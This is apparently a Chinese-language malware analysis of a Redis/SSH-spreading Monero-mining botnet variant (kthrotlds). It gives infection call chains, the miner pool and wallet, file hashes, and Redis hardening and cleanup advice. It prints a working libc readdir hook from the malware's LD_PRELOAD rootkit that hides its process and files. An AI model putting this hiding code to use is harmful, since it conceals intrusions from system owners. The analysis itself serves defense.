发现其和之前的脚本没有太多区别，这里主要将curl获取的图片文件重命名为了kthrotlds（原来是watchdogs）。
如需对脚本内容进行进行进一步的了解，请参考上一篇分析文章，这里就不做过多分析了：  
https://www.anquanke.com/post/id/171692
## 0x3 横向传播
下面我们看下病毒式如何进行横向传播的：
### 0x1 Readis攻击：
遍历内网ip及外网ip攻击redis服务器：
测试机上通过wireshark抓取到的redis攻击行为
攻击程序调用过程：
Main_main
->main_attack
->github_com_hippies_LSD_LSDA_Ago
->github_com_hippies_LSD_LSDA_Ago_func1
->github_com_hippies_LSD_LSDA_runtwo
->github_com_hippies_LSD_LSDA_run
->github_com_gomodule_redigo_redis_DiaTimeout
->github_com_gomodule_redigo_redis_Dial
->github_com_gomodule_redigo_redis__conn_Do
->github_com_gomodule_redigo_redis__conn_DoWithTimeout
->github_com_gomodule_redigo_redis__conn_writeCommand
相关代码：
### 0x2 ssh爆破
测试机上通过wireshark抓取到的ssh爆破行为：
攻击程序调用过程
Main_main
-> main_attack
->github_com_hippies_LSD_LSDA_Bbgo
->github_com_hippies_LSD_LSDA_bgo_func1
->github_com_hippies_LSD_LSDA_cmdtwo
->github_com_hippies_LSD_LSDA_cmd
->Golang_org_x_crpyto_ssh_Client_NewSession
相关代码
这里是攻击程序的入口（main_attack）主要有两个攻击模块，一个是ssh爆破，另一个式redis未授权攻击，与上一个版本一样。
## 0x4 针对ksoftirqds的分析
下面我们来看下ksoftirqds这个文件。
通过分析发现其使用的还是xmr-stak这个挖矿系统
该项目地址是：
通过字符串检索找到其矿池地址，发现矿池已经改变
这里矿池地址为：
sg.minexmr.com:5555
进一步跟入找到其钱包地址
其钱包id为：
47eCpELDZBiVoxDT1tBxCX7fFU4kcSTDLTW2FzYTuB1H3yzrKTtXLAVRsBWcsYpfQzfHjHKtQAJshNyTU88LwNY4Q3rHFYA
以下是该钱包账户的收益情况
## 0x5 针对libcset.c的分析
在kthrotlds中，对libcset.c进行了编译，并将编译生成后的/usr/local/lib/libcset.so设置为预加载动态链接库。
以下是libcset.c的函数列表
很明显病毒是通过hook libc.so中的函数的方式将与病毒相关的信息进行了隐藏。
如readdir函数
    struct dirent *
    readdir (DIR * dirp)
    {
      struct dirent *dir;
      if (!libc){
            libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                    if (!libc){
                        libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                    }
                }
            }
      }
      if (!old_readdir)
        old_readdir = dlsym (libc, "readdir");
      do {
        dir = old_readdir (dirp);
        if(dir != NULL) {
            char dir_name[256];
            char process_name[256];
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) && strcmp(dir_name, "/proc") == 0 && get_process_name(dir->d_name, process_name) && strcmp(process_name, MAGIC_STRING) == 0){
                return NULL;
            }else if (strcmp(process_name, MAGIC_DEAMON) == 0){
                return NULL;
            }
        }
        if (dir != NULL
           && (strcmp (dir->d_name, ".\0") || strcmp (dir->d_name, "/\0")))
          continue;
      }
      while (dir
            && (strstr (dir->d_name, MAGIC_STRING) != 0 || strstr (dir->d_name, CONFIG_FILE) != 0 || strstr (dir->d_name, LIB_FILE) != 0));
      return dir;
    }
这里是对readdir函数进行了hook，对其中的进程名(病毒进程名，kthrotlds)，病毒配置文件名，动态链接库名(libcset.so)进行了检查，隐藏查询结果中包含这三者的信息。其他的函数这里就不做过多分析了。
## 0x6 分析总结
1、相对于之前的watchdogs,其加壳方案并没有什么太大的改变，只是对于病毒程序的加固方面进行了一些修改，即将原本的upx壳的magic
number改为了:4c 53 44 21。那么相应的应对措施就是，在脱壳之前，将其复原为55 50 58 21。
2、进行ssh爆破及redis攻击，目的是进行横向病毒传播，扩大挖矿僵尸网络的势力
3、通过inotify监控/bin文件目录，发现其并没有删除netstat命令，这是与watchdogs的区别之一。
4、ksofttirqds程序主要是使用xmr-stak挖矿程序挖掘门罗币
5、编译libcset.c并将libcset.so设置为预加载动态链接库，隐藏病毒相关。
6、之前版本是将watchdog程序设置为开机启动项，而当前版本是编写了一个名叫netdns的脚本将其设置为开机启动项，并作为kthrotlds的守护进程。
7、矿池及钱包地址：
矿池：
sg.minexmr.com:5555
钱包地址：
47eCpELDZBiVoxDT1tBxCX7fFU4kcSTDLTW2FzYTuB1H3yzrKTtXLAVRsBWcsYpfQzfHjHKtQAJshNyTU88LwNY4Q3rHFYA
8、域名：
（未改变）
对应ip：
104.20.209.21（未改变）
9、相关Md5特征：
da7ee5683fb870bae61e9c4088a661e4
66613e2e4210dce89b562635b769bc21
83e651497c59a14ca8d5abab85565955
4c62c53ae69d8e9290aaccb5ee694716
f1bdc8b12f2ef0279cd265c79bd6fd9e
c7560dd3933774185ce19ddbee5e526c
## 0x6 加固建议
病毒程序可能是通过利用redis未授权漏洞植入，所以请做好redis方面的加固。
Redis未授权漏洞简介：Redis在默认配置下，会将服务绑定在0.0.0.0：6379上，即暴露在公网上。如果同时又没有开启相关的认证，就会导致任意用户访问redis服务，进行数据库操作，并且通过进一步利用，还可以获得系统权限。
以下是redis方面的加固建议：
1\. 将修改redis配置文件，将服务绑定在本机127.0.0.1上。
2.修改redis.conf，设置访问认证，启用密码认证。  
3\. 在防火墙处指定可访问redis服务的ip 。
4\. 修改修改redis默认端口。
5\. 禁用config指令防止恶意操作，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度。
6\. 使用普通权限运行redis服务，这样即使攻击者获得了服务器权限也只是普通用户权限。
## 0x7 病毒处置办法
1）默安科技已针对病毒开发自动化清理脚本，脚本地址：
https://github.com/MoreSecLab/DDG_MalWare_Clean_Tool
3）建议使用默安科技哨兵云对全网服务器进行排查Redis未授权访问漏洞并进行安全加固，从源头上避免感染病毒。
4）紧急情况下，为避免内网大量传播，可以临时对被感染机器先进行断网隔离处理。
5）不影响业务的情况下，建议临时删除机器上.ssh/known_hosts和登录密钥文件。